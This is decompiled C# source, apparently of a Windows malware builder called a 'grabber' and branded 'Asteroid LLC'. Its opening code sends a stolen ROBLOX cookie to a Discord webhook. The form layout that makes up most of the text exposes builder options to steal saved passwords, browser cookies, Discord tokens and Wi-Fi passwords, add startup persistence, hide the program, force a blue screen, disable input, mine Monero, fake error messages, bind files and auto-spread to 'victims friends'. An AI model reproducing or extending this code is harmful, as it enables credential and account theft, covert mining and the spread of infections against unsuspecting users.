					embedMaker.AddField("Premium: ", content3, false);
					embedMaker.AddField("ROBLOX Cookie: ", content, false);
					string text2 = this.webhookIDbox.Text;
					ulong webhookId = Convert.ToUInt64(text2);
					client.SendWebhookMessage(webhookId, this.webhookTextBox.Text, "", embedMaker, null);
					MessageBox.Show("ROBLOX Account Checker sent to your webhook!", "Asteroid LLC");
					return;
				}
				catch (Exception ex)
				{
					MessageBox.Show("Please change your Webhook!", "Asteroid LLC");
					return;
				}
			}
			MessageBox.Show("ROBLOX Cookie is invalid!", "Asteroid LLC");
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x000038A0 File Offset: 0x00001AA0
		private void metroButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x00007D58 File Offset: 0x00005F58
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x00007D78 File Offset: 0x00005F78
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
			this.tabPage1 = new TabPage();
			this.tabPage2 = new TabPage();
			this.mainTabControl = new MetroTabControl();
			this.builderTab = new MetroTabPage();
			this.metroTabControl2 = new MetroTabControl();
			this.optionsTab = new MetroTabPage();
			this.internetCheckBox1 = new MetroCheckBox();
			this.wifiCheckBox1 = new MetroCheckBox();
			this.copyToTempCheckBox = new MetroCheckBox();
			this.robloxCheckBox = new MetroCheckBox();
			this.cookiesCheckBox = new MetroCheckBox();
			this.disableInputCheckBox = new MetroCheckBox();
			this.cetrainerCheckBox = new MetroCheckBox();
			this.webcamCheckBox = new MetroCheckBox();
			this.screenshotCheckBox = new MetroCheckBox();
			this.discordCheckBox = new MetroCheckBox();
			this.passwordsCheckBox = new MetroCheckBox();
			this.startupCheckBox = new MetroCheckBox();
			this.hideGrabberCheckBox = new MetroCheckBox();
			this.bsodCheckBox = new MetroCheckBox();
			this.extraTab = new MetroTabPage();
			this.blueTrackBar = new SiticoneMetroTrackBar();
			this.greenTrackBar = new SiticoneMetroTrackBar();
			this.redTrackBar = new SiticoneMetroTrackBar();
			this.poolTextBox = new MetroTextBox();
			this.walletTextBox = new MetroTextBox();
			this.moneroMinerCheckBox = new MetroCheckBox();
			this.chooseIconButton = new MetroButton();
			this.comingSoonPanel3 = new MetroPanel();
			this.comingSoonLabel3 = new MetroLabel();
			this.comingSoonPanel2 = new MetroPanel();
			this.comingSoonLabel2 = new MetroLabel();
			this.spreadMessage = new MetroTextBox();
			this.autoSpreadCheckBox = new MetroCheckBox();
			this.embedColorCheckBox = new MetroCheckBox();
			this.errorTitleTextBox = new MetroTextBox();
			this.embedColorPictureBox = new PictureBox();
			this.iconPictureBox = new PictureBox();
			this.errorMessageTextBox = new MetroTextBox();
			this.iconCheckBox = new MetroCheckBox();
			this.fakeErrorCheckBox = new MetroCheckBox();
			this.iconPathTextBox = new MetroTextBox();
			this.pumpAmountTextBox = new MetroTextBox();
			this.byteCheckBox = new MetroCheckBox();
			this.kiloByteCheckBox = new MetroCheckBox();
			this.filePumperCheckBox = new MetroCheckBox();
			this.megaByteCheckBox = new MetroCheckBox();
			this.pluginsTab = new MetroTabPage();
			this.pluginTextBox = new ZeroitCodeTextBox();
			this.binderTab = new MetroTabPage();
			this.removeButton = new MetroButton();
			this.filesListView = new ListView();
			this.fileNameHeader = new ColumnHeader();
			this.fileSizeHeader = new ColumnHeader();
			this.addButton = new MetroButton();
			this.compilerTab = new MetroTabPage();
			this.compileButton = new MetroButton();
			this.compilerOutputTextBox = new MetroTextBox();
			this.webhookGroupBox = new GroupBox();
			this.emailCheckBox1 = new MetroCheckBox();
			this.webhookIDbox = new MetroTextBox();
			this.testWebhookButton = new MetroButton();
			this.webhookTextBox = new MetroTextBox();
			this.metroTabPage2 = new MetroTabPage();
			this.groupBox3 = new GroupBox();
			this.rbxl = new MetroCheckBox();
			this.appname = new MetroTextBox();
			this.mp4 = new MetroCheckBox();
			this.pdf = new MetroCheckBox();
			this.txt = new MetroCheckBox();
			this.png = new MetroCheckBox();
			this.py = new MetroCheckBox();
			this.metroTabControl1 = new MetroTabControl();
			this.otherTab = new MetroTabPage();
			this.groupBox2 = new GroupBox();
			this.metroButton3 = new MetroButton();
			this.rblxc = new MetroTextBox();
			this.settingsTab = new MetroTabPage();
			this.groupBox1 = new GroupBox();
			this.opacityTrackBar = new MetroTrackBar();
			this.stylesComboBox = new MetroComboBox();
			this.userInfoGroupBox = new GroupBox();
			this.userLabel = new MetroLabel();
			this.expiryLabel = new MetroLabel();
			this.styleManager = new MetroStyleManager(this.components);
			this.txtCookies = new MetroTextBox();
			this.txtPasswords = new MetroTextBox();
			this.metroToolTip = new MetroToolTip();
			this.groupBox4 = new GroupBox();
			this.mainTabControl.SuspendLayout();
			this.builderTab.SuspendLayout();
			this.metroTabControl2.SuspendLayout();
			this.optionsTab.SuspendLayout();
			this.extraTab.SuspendLayout();
			this.comingSoonPanel3.SuspendLayout();
			this.comingSoonPanel2.SuspendLayout();
			((ISupportInitialize)this.embedColorPictureBox).BeginInit();
			((ISupportInitialize)this.iconPictureBox).BeginInit();
			this.pluginsTab.SuspendLayout();
			this.pluginTextBox.BeginInit();
			this.binderTab.SuspendLayout();
			this.compilerTab.SuspendLayout();
			this.webhookGroupBox.SuspendLayout();
			this.metroTabPage2.SuspendLayout();
			this.groupBox3.SuspendLayout();
			this.otherTab.SuspendLayout();
			this.groupBox2.SuspendLayout();
			this.settingsTab.SuspendLayout();
			this.groupBox1.SuspendLayout();
			this.userInfoGroupBox.SuspendLayout();
			this.styleManager.BeginInit();
			base.SuspendLayout();
			this.tabPage1.Location = new Point(4, 53);
			this.tabPage1.Name = "tabPage1";
			this.tabPage1.Padding = new Padding(3);
			this.tabPage1.Size = new Size(192, 43);
			this.tabPage1.TabIndex = 0;
			this.tabPage1.Text = "tabPage1";
			this.tabPage1.UseVisualStyleBackColor = true;
			this.tabPage2.Location = new Point(4, 53);
			this.tabPage2.Name = "tabPage2";
			this.tabPage2.Padding = new Padding(3);
			this.tabPage2.Size = new Size(192, 43);
			this.tabPage2.TabIndex = 3;
			this.tabPage2.Text = "tabPage2";
			this.tabPage2.UseVisualStyleBackColor = true;
			this.mainTabControl.Controls.Add(this.builderTab);
			this.mainTabControl.Controls.Add(this.metroTabPage2);
			this.mainTabControl.Controls.Add(this.otherTab);
			this.mainTabControl.Controls.Add(this.settingsTab);
			this.mainTabControl.Location = new Point(23, 63);
			this.mainTabControl.Multiline = true;
			this.mainTabControl.Name = "mainTabControl";
			this.mainTabControl.SelectedIndex = 2;
			this.mainTabControl.Size = new Size(915, 441);
			this.mainTabControl.SizeMode = TabSizeMode.Fixed;
			this.mainTabControl.TabIndex = 42;
			this.mainTabControl.Theme = 2;
			this.mainTabControl.UseSelectable = true;
			this.builderTab.BorderStyle = BorderStyle.FixedSingle;
			this.builderTab.Controls.Add(this.metroTabControl2);
			this.builderTab.Controls.Add(this.webhookGroupBox);
			this.builderTab.HorizontalScrollbarBarColor = true;
			this.builderTab.HorizontalScrollbarHighlightOnWheel = false;
			this.builderTab.HorizontalScrollbarSize = 10;
			this.builderTab.Location = new Point(4, 38);
			this.builderTab.Name = "builderTab";
			this.builderTab.Size = new Size(907, 399);
			this.builderTab.TabIndex = 0;
			this.builderTab.Text = "Builder";
			this.builderTab.Theme = 2;
			this.builderTab.VerticalScrollbarBarColor = true;
			this.builderTab.VerticalScrollbarHighlightOnWheel = false;
			this.builderTab.VerticalScrollbarSize = 10;
			this.metroTabControl2.Controls.Add(this.optionsTab);
			this.metroTabControl2.Controls.Add(this.extraTab);
			this.metroTabControl2.Controls.Add(this.pluginsTab);
			this.metroTabControl2.Controls.Add(this.binderTab);
			this.metroTabControl2.Controls.Add(this.compilerTab);
			this.metroTabControl2.Location = new Point(26, 99);
			this.metroTabControl2.Name = "metroTabControl2";
			this.metroTabControl2.SelectedIndex = 0;
			this.metroTabControl2.Size = new Size(853, 276);
			this.metroTabControl2.SizeMode = TabSizeMode.Fixed;
			this.metroTabControl2.TabIndex = 18;
			this.metroTabControl2.Theme = 2;
			this.metroTabControl2.UseSelectable = true;
			this.optionsTab.BorderStyle = BorderStyle.FixedSingle;
			this.optionsTab.Controls.Add(this.internetCheckBox1);
			this.optionsTab.Controls.Add(this.wifiCheckBox1);
			this.optionsTab.Controls.Add(this.copyToTempCheckBox);
			this.optionsTab.Controls.Add(this.robloxCheckBox);
			this.optionsTab.Controls.Add(this.cookiesCheckBox);
			this.optionsTab.Controls.Add(this.disableInputCheckBox);
			this.optionsTab.Controls.Add(this.cetrainerCheckBox);
			this.optionsTab.Controls.Add(this.webcamCheckBox);
			this.optionsTab.Controls.Add(this.screenshotCheckBox);
			this.optionsTab.Controls.Add(this.discordCheckBox);
			this.optionsTab.Controls.Add(this.passwordsCheckBox);
			this.optionsTab.Controls.Add(this.startupCheckBox);
			this.optionsTab.Controls.Add(this.hideGrabberCheckBox);
			this.optionsTab.Controls.Add(this.bsodCheckBox);
			this.optionsTab.HorizontalScrollbarBarColor = true;
			this.optionsTab.HorizontalScrollbarHighlightOnWheel = false;
			this.optionsTab.HorizontalScrollbarSize = 10;
			this.optionsTab.Location = new Point(4, 38);
			this.optionsTab.Name = "optionsTab";
			this.optionsTab.Size = new Size(845, 234);
			this.optionsTab.Style = 13;
			this.optionsTab.TabIndex = 0;
			this.optionsTab.Text = "Options";
			this.optionsTab.Theme = 2;
			this.optionsTab.VerticalScrollbarBarColor = true;
			this.optionsTab.VerticalScrollbarHighlightOnWheel = false;
			this.optionsTab.VerticalScrollbarSize = 10;
			this.optionsTab.Click += this.optionsTab_Click;
			this.internetCheckBox1.AutoSize = true;
			this.internetCheckBox1.Location = new Point(699, 145);
			this.internetCheckBox1.Name = "internetCheckBox1";
			this.internetCheckBox1.Size = new Size(105, 15);
			this.internetCheckBox1.TabIndex = 50;
			this.internetCheckBox1.Text = "Disable Internet";
			this.internetCheckBox1.Theme = 2;
			this.metroToolTip.SetToolTip(this.internetCheckBox1, "Disable the Internet");
			this.internetCheckBox1.UseSelectable = true;
			this.wifiCheckBox1.AutoSize = true;
			this.wifiCheckBox1.Location = new Point(58, 145);
			this.wifiCheckBox1.Name = "wifiCheckBox1";
			this.wifiCheckBox1.Size = new Size(95, 15);
			this.wifiCheckBox1.TabIndex = 49;
			this.wifiCheckBox1.Text = "Wifi Recovery";
			this.wifiCheckBox1.Theme = 2;
			this.metroToolTip.SetToolTip(this.wifiCheckBox1, "Recovery of the saved-Wifi passwords");
			this.wifiCheckBox1.UseSelectable = true;
			this.copyToTempCheckBox.AutoSize = true;
			this.copyToTempCheckBox.Location = new Point(477, 82);
			this.copyToTempCheckBox.Name = "copyToTempCheckBox";
			this.copyToTempCheckBox.Size = new Size(98, 15);
			this.copyToTempCheckBox.TabIndex = 48;
			this.copyToTempCheckBox.Text = "Copy To Temp";
			this.copyToTempCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.copyToTempCheckBox, "Create a copy in the %temp% folder");
			this.copyToTempCheckBox.UseSelectable = true;
			this.robloxCheckBox.AutoSize = true;
			this.robloxCheckBox.Location = new Point(58, 113);
			this.robloxCheckBox.Name = "robloxCheckBox";
			this.robloxCheckBox.Size = new Size(119, 15);
			this.robloxCheckBox.TabIndex = 47;
			this.robloxCheckBox.Text = "ROBLOX Recovery";
			this.robloxCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.robloxCheckBox, "Recovery of the .ROBLOSECURITY cookie from ROBLOX");
			this.robloxCheckBox.UseSelectable = true;
			this.cookiesCheckBox.AutoSize = true;
			this.cookiesCheckBox.Location = new Point(58, 82);
			this.cookiesCheckBox.Name = "cookiesCheckBox";
			this.cookiesCheckBox.Size = new Size(111, 15);
			this.cookiesCheckBox.TabIndex = 46;
			this.cookiesCheckBox.Text = "Cookie Recovery";
			this.cookiesCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.cookiesCheckBox, "Recovery of cookies from Chrome, Firefox and Edge");
			this.cookiesCheckBox.UseSelectable = true;
			this.disableInputCheckBox.AutoSize = true;
			this.disableInputCheckBox.Location = new Point(699, 113);
			this.disableInputCheckBox.Name = "disableInputCheckBox";
			this.disableInputCheckBox.Size = new Size(92, 15);
			this.disableInputCheckBox.TabIndex = 45;
			this.disableInputCheckBox.Text = "Disable Input";
			this.disableInputCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.disableInputCheckBox, "Disable the keyboard and mouse");
			this.disableInputCheckBox.UseSelectable = true;
			this.cetrainerCheckBox.AutoSize = true;
			this.cetrainerCheckBox.Location = new Point(699, 51);
			this.cetrainerCheckBox.Name = "cetrainerCheckBox";
			this.cetrainerCheckBox.Size = new Size(86, 15);
			this.cetrainerCheckBox.TabIndex = 41;
			this.cetrainerCheckBox.Text = ".CETRAINER";
			this.cetrainerCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.cetrainerCheckBox, "Create the executable with a .CETRAINER extension ");
			this.cetrainerCheckBox.UseSelectable = true;
			this.webcamCheckBox.AutoSize = true;
			this.webcamCheckBox.Enabled = false;
			this.webcamCheckBox.Location = new Point(279, 51);
			this.webcamCheckBox.Name = "webcamCheckBox";
			this.webcamCheckBox.Size = new Size(122, 15);
			this.webcamCheckBox.TabIndex = 37;
			this.webcamCheckBox.Text = "Webcam Snapshot";
			this.webcamCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.webcamCheckBox, "Create a snapshot from the camera");
			this.webcamCheckBox.UseSelectable = true;
			this.screenshotCheckBox.AutoSize = true;
			this.screenshotCheckBox.Enabled = false;
			this.screenshotCheckBox.Location = new Point(279, 82);
			this.screenshotCheckBox.Name = "screenshotCheckBox";
			this.screenshotCheckBox.Size = new Size(81, 15);
			this.screenshotCheckBox.TabIndex = 38;
			this.screenshotCheckBox.Text = "Screenshot";
			this.screenshotCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.screenshotCheckBox, "Create a screenshot from the computer");
			this.screenshotCheckBox.UseSelectable = true;
			this.discordCheckBox.AutoSize = true;
			this.discordCheckBox.Location = new Point(279, 113);
			this.discordCheckBox.Name = "discordCheckBox";
			this.discordCheckBox.Size = new Size(114, 15);
			this.discordCheckBox.TabIndex = 44;
			this.discordCheckBox.Text = "Discord Recovery";
			this.discordCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.discordCheckBox, "Trace the discord token after the password has been changed");
			this.discordCheckBox.UseSelectable = true;
			this.passwordsCheckBox.AutoSize = true;
			this.passwordsCheckBox.Location = new Point(58, 51);
			this.passwordsCheckBox.Name = "passwordsCheckBox";
			this.passwordsCheckBox.Size = new Size(124, 15);
			this.passwordsCheckBox.TabIndex = 39;
			this.passwordsCheckBox.Text = "Password Recovery";
			this.passwordsCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.passwordsCheckBox, "Recovery of the saved-Passwords");
			this.passwordsCheckBox.UseSelectable = true;
			this.startupCheckBox.AutoSize = true;
			this.startupCheckBox.Location = new Point(477, 51);
			this.startupCheckBox.Name = "startupCheckBox";
			this.startupCheckBox.Size = new Size(101, 15);
			this.startupCheckBox.TabIndex = 43;
			this.startupCheckBox.Text = "Add To Startup";
			this.startupCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.startupCheckBox, "Execute at start-up");
			this.startupCheckBox.UseSelectable = true;
			this.hideGrabberCheckBox.AutoSize = true;
			this.hideGrabberCheckBox.Location = new Point(477, 113);
			this.hideGrabberCheckBox.Name = "hideGrabberCheckBox";
			this.hideGrabberCheckBox.Size = new Size(93, 15);
			this.hideGrabberCheckBox.TabIndex = 40;
			this.hideGrabberCheckBox.Text = "Hide Grabber";
			this.hideGrabberCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.hideGrabberCheckBox, "Hides the grabber after opening");
			this.hideGrabberCheckBox.UseSelectable = true;
			this.bsodCheckBox.AutoSize = true;
			this.bsodCheckBox.Location = new Point(699, 82);
			this.bsodCheckBox.Name = "bsodCheckBox";
			this.bsodCheckBox.Size = new Size(51, 15);
			this.bsodCheckBox.TabIndex = 42;
			this.bsodCheckBox.Text = "BSoD";
			this.bsodCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.bsodCheckBox, "Blue Screen of Death");
			this.bsodCheckBox.UseSelectable = true;
			this.extraTab.BorderStyle = BorderStyle.FixedSingle;
			this.extraTab.Controls.Add(this.blueTrackBar);
			this.extraTab.Controls.Add(this.greenTrackBar);
			this.extraTab.Controls.Add(this.redTrackBar);
			this.extraTab.Controls.Add(this.poolTextBox);
			this.extraTab.Controls.Add(this.walletTextBox);
			this.extraTab.Controls.Add(this.moneroMinerCheckBox);
			this.extraTab.Controls.Add(this.chooseIconButton);
			this.extraTab.Controls.Add(this.comingSoonPanel3);
			this.extraTab.Controls.Add(this.comingSoonPanel2);
			this.extraTab.Controls.Add(this.spreadMessage);
			this.extraTab.Controls.Add(this.autoSpreadCheckBox);
			this.extraTab.Controls.Add(this.embedColorCheckBox);
			this.extraTab.Controls.Add(this.errorTitleTextBox);
			this.extraTab.Controls.Add(this.embedColorPictureBox);
			this.extraTab.Controls.Add(this.iconPictureBox);
			this.extraTab.Controls.Add(this.errorMessageTextBox);
			this.extraTab.Controls.Add(this.iconCheckBox);
			this.extraTab.Controls.Add(this.fakeErrorCheckBox);
			this.extraTab.Controls.Add(this.iconPathTextBox);
			this.extraTab.Controls.Add(this.pumpAmountTextBox);
			this.extraTab.Controls.Add(this.byteCheckBox);
			this.extraTab.Controls.Add(this.kiloByteCheckBox);
			this.extraTab.Controls.Add(this.filePumperCheckBox);
			this.extraTab.Controls.Add(this.megaByteCheckBox);
			this.extraTab.HorizontalScrollbarBarColor = true;
			this.extraTab.HorizontalScrollbarHighlightOnWheel = false;
			this.extraTab.HorizontalScrollbarSize = 10;
			this.extraTab.Location = new Point(4, 38);
			this.extraTab.Name = "extraTab";
			this.extraTab.Size = new Size(845, 234);
			this.extraTab.Style = 13;
			this.extraTab.TabIndex = 1;
			this.extraTab.Text = "Extra";
			this.extraTab.Theme = 2;
			this.extraTab.VerticalScrollbarBarColor = true;
			this.extraTab.VerticalScrollbarHighlightOnWheel = false;
			this.extraTab.VerticalScrollbarSize = 10;
			this.blueTrackBar.BackColor = Color.Transparent;
			this.blueTrackBar.Enabled = false;
			this.blueTrackBar.FillColor = Color.FromArgb(193, 200, 207);
			this.blueTrackBar.HoveredState.Parent = this.blueTrackBar;
			this.blueTrackBar.IndicateFocus = false;
			this.blueTrackBar.Location = new Point(644, 92);
			this.blueTrackBar.Maximum = 255;
			this.blueTrackBar.Name = "blueTrackBar";
			this.blueTrackBar.Size = new Size(111, 13);
			this.blueTrackBar.TabIndex = 55;
			this.blueTrackBar.ThumbColor = Color.Blue;
			this.blueTrackBar.Value = 255;
			this.blueTrackBar.ValueChanged += this.blueTrackBar_ValueChanged;
			this.greenTrackBar.BackColor = Color.Transparent;
			this.greenTrackBar.Enabled = false;
			this.greenTrackBar.FillColor = Color.FromArgb(193, 200, 207);
			this.greenTrackBar.HoveredState.Parent = this.greenTrackBar;
			this.greenTrackBar.IndicateFocus = false;
			this.greenTrackBar.Location = new Point(644, 73);
			this.greenTrackBar.Maximum = 255;
			this.greenTrackBar.Name = "greenTrackBar";
			this.greenTrackBar.Size = new Size(111, 13);
			this.greenTrackBar.TabIndex = 54;
			this.greenTrackBar.ThumbColor = Color.FromArgb(0, 192, 0);
			this.greenTrackBar.Value = 255;
			this.greenTrackBar.ValueChanged += this.greenTrackBar_ValueChanged;
			this.redTrackBar.BackColor = Color.Transparent;
			this.redTrackBar.Enabled = false;
			this.redTrackBar.FillColor = Color.FromArgb(193, 200, 207);
			this.redTrackBar.HoveredState.Parent = this.redTrackBar;
			this.redTrackBar.IndicateFocus = false;
			this.redTrackBar.Location = new Point(644, 55);
			this.redTrackBar.Maximum = 255;
			this.redTrackBar.Name = "redTrackBar";
			this.redTrackBar.Size = new Size(111, 13);
			this.redTrackBar.TabIndex = 53;
			this.redTrackBar.ThumbColor = Color.Red;
			this.redTrackBar.Value = 255;
			this.redTrackBar.ValueChanged += this.redTrackBar_ValueChanged;
			this.poolTextBox.CustomButton.Image = null;
			this.poolTextBox.CustomButton.Location = new Point(147, 2);
			this.poolTextBox.CustomButton.Name = "";
			this.poolTextBox.CustomButton.Size = new Size(17, 17);
			this.poolTextBox.CustomButton.Style = 4;
			this.poolTextBox.CustomButton.TabIndex = 1;
			this.poolTextBox.CustomButton.Theme = 1;
			this.poolTextBox.CustomButton.UseSelectable = true;
			this.poolTextBox.CustomButton.Visible = false;
			this.poolTextBox.Enabled = false;
			this.poolTextBox.ForeColor = Color.White;
			this.poolTextBox.Lines = new string[0];
			this.poolTextBox.Location = new Point(235, 152);
			this.poolTextBox.MaxLength = 32767;
			this.poolTextBox.Name = "poolTextBox";
			this.poolTextBox.PasswordChar = '\0';
			this.poolTextBox.PromptText = "Pool URL";
			this.poolTextBox.ScrollBars = ScrollBars.None;
			this.poolTextBox.SelectedText = "";
			this.poolTextBox.SelectionLength = 0;
			this.poolTextBox.SelectionStart = 0;
			this.poolTextBox.ShortcutsEnabled = true;
			this.poolTextBox.Size = new Size(167, 22);
			this.poolTextBox.TabIndex = 47;
			this.poolTextBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.poolTextBox, "Pool url e.g: xmr-eu1.nanopool.org:14444");
			this.poolTextBox.UseSelectable = true;
			this.poolTextBox.WaterMark = "Pool URL";
			this.poolTextBox.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.poolTextBox.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.walletTextBox.CustomButton.Image = null;
			this.walletTextBox.CustomButton.Location = new Point(147, 2);
			this.walletTextBox.CustomButton.Name = "";
			this.walletTextBox.CustomButton.Size = new Size(17, 17);
			this.walletTextBox.CustomButton.Style = 4;
			this.walletTextBox.CustomButton.TabIndex = 1;
			this.walletTextBox.CustomButton.Theme = 1;
			this.walletTextBox.CustomButton.UseSelectable = true;
			this.walletTextBox.CustomButton.Visible = false;
			this.walletTextBox.Enabled = false;
			this.walletTextBox.ForeColor = Color.White;
			this.walletTextBox.Lines = new string[0];
			this.walletTextBox.Location = new Point(235, 180);
			this.walletTextBox.MaxLength = 32767;
			this.walletTextBox.Name = "walletTextBox";
			this.walletTextBox.PasswordChar = '\0';
			this.walletTextBox.PromptText = "Wallet";
			this.walletTextBox.ScrollBars = ScrollBars.None;
			this.walletTextBox.SelectedText = "";
			this.walletTextBox.SelectionLength = 0;
			this.walletTextBox.SelectionStart = 0;
			this.walletTextBox.ShortcutsEnabled = true;
			this.walletTextBox.Size = new Size(167, 22);
			this.walletTextBox.TabIndex = 48;
			this.walletTextBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.walletTextBox, "Wallet address that will get the bitcoin");
			this.walletTextBox.UseSelectable = true;
			this.walletTextBox.WaterMark = "Wallet";
			this.walletTextBox.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.walletTextBox.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.moneroMinerCheckBox.AutoSize = true;
			this.moneroMinerCheckBox.Location = new Point(235, 129);
			this.moneroMinerCheckBox.Name = "moneroMinerCheckBox";
			this.moneroMinerCheckBox.Size = new Size(99, 15);
			this.moneroMinerCheckBox.TabIndex = 49;
			this.moneroMinerCheckBox.Text = "Monero Miner";
			this.moneroMinerCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.moneroMinerCheckBox, "Mines bitcoin to your wallet address");
			this.moneroMinerCheckBox.UseSelectable = true;
			this.moneroMinerCheckBox.CheckedChanged += this.bitcoinMinerCheckBox_CheckedChanged;
			this.chooseIconButton.Enabled = false;
			this.chooseIconButton.Highlight = true;
			this.chooseIconButton.Location = new Point(30, 83);
			this.chooseIconButton.Name = "chooseIconButton";
			this.chooseIconButton.Size = new Size(114, 22);
			this.chooseIconButton.TabIndex = 45;
			this.chooseIconButton.Text = "Choose Icon";
			this.chooseIconButton.Theme = 2;
			this.chooseIconButton.UseSelectable = true;
			this.chooseIconButton.Click += this.chooseIconButton_Click;
			this.comingSoonPanel3.BackColor = Color.Transparent;
			this.comingSoonPanel3.BorderStyle = BorderStyle.FixedSingle;
			this.comingSoonPanel3.Controls.Add(this.comingSoonLabel3);
			this.comingSoonPanel3.ForeColor = Color.White;
			this.comingSoonPanel3.HorizontalScrollbarBarColor = true;
			this.comingSoonPanel3.HorizontalScrollbarHighlightOnWheel = false;
			this.comingSoonPanel3.HorizontalScrollbarSize = 10;
			this.comingSoonPanel3.Location = new Point(644, 129);
			this.comingSoonPanel3.Name = "comingSoonPanel3";
			this.comingSoonPanel3.Size = new Size(167, 73);
			this.comingSoonPanel3.TabIndex = 42;
			this.comingSoonPanel3.Theme = 2;
			this.comingSoonPanel3.VerticalScrollbarBarColor = true;
			this.comingSoonPanel3.VerticalScrollbarHighlightOnWheel = false;
			this.comingSoonPanel3.VerticalScrollbarSize = 10;
			this.comingSoonLabel3.AutoSize = true;
			this.comingSoonLabel3.Location = new Point(36, 25);
			this.comingSoonLabel3.Name = "comingSoonLabel3";
			this.comingSoonLabel3.Size = new Size(90, 19);
			this.comingSoonLabel3.TabIndex = 4;
			this.comingSoonLabel3.Text = "Coming Soon";
			this.comingSoonLabel3.Theme = 2;
			this.comingSoonPanel2.BackColor = Color.Transparent;
			this.comingSoonPanel2.BorderStyle = BorderStyle.FixedSingle;
			this.comingSoonPanel2.Controls.Add(this.comingSoonLabel2);
			this.comingSoonPanel2.ForeColor = Color.White;
			this.comingSoonPanel2.HorizontalScrollbarBarColor = true;
			this.comingSoonPanel2.HorizontalScrollbarHighlightOnWheel = false;
			this.comingSoonPanel2.HorizontalScrollbarSize = 10;
			this.comingSoonPanel2.Location = new Point(433, 129);
			this.comingSoonPanel2.Name = "comingSoonPanel2";
			this.comingSoonPanel2.Size = new Size(167, 73);
			this.comingSoonPanel2.TabIndex = 41;
			this.comingSoonPanel2.Theme = 2;
			this.comingSoonPanel2.VerticalScrollbarBarColor = true;
			this.comingSoonPanel2.VerticalScrollbarHighlightOnWheel = false;
			this.comingSoonPanel2.VerticalScrollbarSize = 10;
			this.comingSoonLabel2.AutoSize = true;
			this.comingSoonLabel2.Location = new Point(36, 25);
			this.comingSoonLabel2.Name = "comingSoonLabel2";
			this.comingSoonLabel2.Size = new Size(90, 19);
			this.comingSoonLabel2.TabIndex = 3;
			this.comingSoonLabel2.Text = "Coming Soon";
			this.comingSoonLabel2.Theme = 2;
			this.spreadMessage.CustomButton.Image = null;
			this.spreadMessage.CustomButton.Location = new Point(119, 2);
			this.spreadMessage.CustomButton.Name = "";
			this.spreadMessage.CustomButton.Size = new Size(45, 45);
			this.spreadMessage.CustomButton.Style = 4;
			this.spreadMessage.CustomButton.TabIndex = 1;
			this.spreadMessage.CustomButton.Theme = 1;
			this.spreadMessage.CustomButton.UseSelectable = true;
			this.spreadMessage.CustomButton.Visible = false;
			this.spreadMessage.Enabled = false;
			this.spreadMessage.ForeColor = Color.White;
			this.spreadMessage.Lines = new string[0];
			this.spreadMessage.Location = new Point(30, 152);
			this.spreadMessage.MaxLength = 32767;
			this.spreadMessage.Multiline = true;
			this.spreadMessage.Name = "spreadMessage";
			this.spreadMessage.PasswordChar = '\0';
			this.spreadMessage.PromptText = "Spread Message";
			this.spreadMessage.ScrollBars = ScrollBars.None;
			this.spreadMessage.SelectedText = "";
			this.spreadMessage.SelectionLength = 0;
			this.spreadMessage.SelectionStart = 0;
			this.spreadMessage.ShortcutsEnabled = true;
			this.spreadMessage.Size = new Size(167, 50);
			this.spreadMessage.TabIndex = 39;
			this.spreadMessage.Theme = 2;
			this.metroToolTip.SetToolTip(this.spreadMessage, "Message that will be sent to victims friends");
			this.spreadMessage.UseSelectable = true;
			this.spreadMessage.WaterMark = "Spread Message";
			this.spreadMessage.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.spreadMessage.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
			this.autoSpreadCheckBox.AutoSize = true;
			this.autoSpreadCheckBox.Location = new Point(30, 129);
			this.autoSpreadCheckBox.Name = "autoSpreadCheckBox";
			this.autoSpreadCheckBox.Size = new Size(88, 15);
			this.autoSpreadCheckBox.TabIndex = 38;
			this.autoSpreadCheckBox.Text = "Auto Spread";
			this.autoSpreadCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.autoSpreadCheckBox, "Automatically sends the grabber to victims friends");
			this.autoSpreadCheckBox.UseSelectable = true;
			this.autoSpreadCheckBox.CheckedChanged += this.autoSpreadCheckBox_CheckedChanged;
			this.embedColorCheckBox.AutoSize = true;
			this.embedColorCheckBox.Location = new Point(644, 32);
			this.embedColorCheckBox.Name = "embedColorCheckBox";
			this.embedColorCheckBox.Size = new Size(137, 15);
			this.embedColorCheckBox.TabIndex = 37;
			this.embedColorCheckBox.Text = "Custom Embed Color";
			this.embedColorCheckBox.Theme = 2;
			this.metroToolTip.SetToolTip(this.embedColorCheckBox, "Color of the embed that grabber sends");
			this.embedColorCheckBox.UseSelectable = true;
			this.embedColorCheckBox.CheckedChanged += this.embedColorCheckBox_CheckedChanged;
			this.errorTitleTextBox.CustomButton.Image = null;
			this.errorTitleTextBox.CustomButton.Location = new Point(147, 2);
			this.errorTitleTextBox.CustomButton.Name = "";
			this.errorTitleTextBox.CustomButton.Size = new Size(17, 17);
			this.errorTitleTextBox.CustomButton.Style = 4;
